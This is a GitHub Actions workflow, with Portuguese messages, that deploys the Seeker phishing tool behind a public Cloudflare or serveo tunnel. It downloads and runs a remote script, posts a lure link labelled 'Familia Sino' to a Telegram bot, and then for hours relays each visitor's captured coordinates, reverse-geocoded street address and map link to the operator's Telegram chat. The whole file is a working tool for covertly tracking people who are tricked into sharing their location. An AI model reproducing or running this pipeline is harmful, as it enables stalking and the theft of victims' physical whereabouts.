name: GH-KALI Seeker
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  seek:
    runs-on: ubuntu-latest
    steps:
      - name: Seeker + tunel + relay pro Telegram
        env:
          TG_TOKEN: "${{ secrets.TELEGRAM_TOKEN }}"
          TG_CHAT: "${{ secrets.TELEGRAM_CHAT_ID }}"
        run: |
          pip3 install -q requests psutil --break-system-packages
          rm -rf /opt/seeker && git clone -q --depth 1 https://github.com/thewhiteh4t/seeker /opt/seeker
          curl -sL -o /tmp/fix.py https://raw.githubusercontent.com/datacfgx/sino-grid/main/tools/seeker-py314-fix.py && python3 /tmp/fix.py
          (cd /opt/seeker && printf '2\nFamilia Sino\nhttps://picsum.photos/300\n' | python3 seeker.py -p 8080 > /tmp/seeker.log 2>&1 &)
          sleep 6
          if ! curl -sf -m 5 http://localhost:8080 > /dev/null; then
            MSGA=$(printf "SEEKER: app nao subiu. Log:\n%s" "$(tail -8 /tmp/seeker.log)")
            curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSGA}" || true
            exit 1
          fi
          curl -sL -o /tmp/cf https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
          chmod +x /tmp/cf
          /tmp/cf tunnel --no-autoupdate --url http://localhost:8080 > /tmp/cf.out 2>&1 &
          URL=""
          for i in $(seq 1 30); do sleep 5; URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' /tmp/cf.out | head -1); [ -n "$URL" ] && break; done
          if [ -z "$URL" ]; then
            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 -N -R 80:localhost:8080 serveo.net > /tmp/serveo.out 2>&1 &
            for i in $(seq 1 12); do sleep 5; URL=$(grep -oE 'https://[a-zA-Z0-9./_-]+' /tmp/serveo.out | head -1); [ -n "$URL" ] && break; done
          fi
          echo "URL=$URL"
          if [ -z "$URL" ]; then
            MSGE=$(printf "SEEKER: nenhum tunel funcionou. cf.out:\n%s\nserveo:\n%s" "$(tail -4 /tmp/cf.out)" "$(tail -4 /tmp/serveo.out 2>/dev/null)")
            curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSGE}" || true
            exit 1
          fi
          MSG=$(printf "SEEKER NO AR\nlink pra mandar:\n%s\n(quem abrir precisa permitir localizacao no navegador)" "$URL")
          curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSG}" || true
          ULT=0
          for i in $(seq 1 290); do
            sleep 60
            N=$(grep -c Latitude /tmp/seeker.log 2>/dev/null) || N=0
            if [ "$N" -gt "$ULT" ]; then
              LIMPO=$(sed 's/\x1b\[[0-9;]*m//g' /tmp/seeker.log)
              LAT=$(echo "$LIMPO" | grep -i Latitude | tail -1 | awk -F': ' '{print $2}' | grep -oE '[-0-9.]+' | head -1)
              LON=$(echo "$LIMPO" | grep -i Longitude | tail -1 | awk -F': ' '{print $2}' | grep -oE '[-0-9.]+' | head -1)
              END=$(curl -s -m 10 -A "sino-kali" "https://nominatim.openstreetmap.org/reverse?lat=${LAT}&lon=${LON}&format=json" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('display_name','endereco nao achado'))" 2>/dev/null || echo "geocodigo falhou")
              BLOCO=$(echo "$LIMPO" | grep -iA6 Latitude | tail -12)
              MSG2=$(printf "LOCALIZACAO PEGA (#%s):\n%s\n\nENDERECO: %s\nMaps: https://maps.google.com/?q=%s,%s" "$N" "$BLOCO" "$END" "$LAT" "$LON")
              curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSG2}" || true
              ULT=$N
            fi
            echo "ciclo $i capturas=$N"
          done
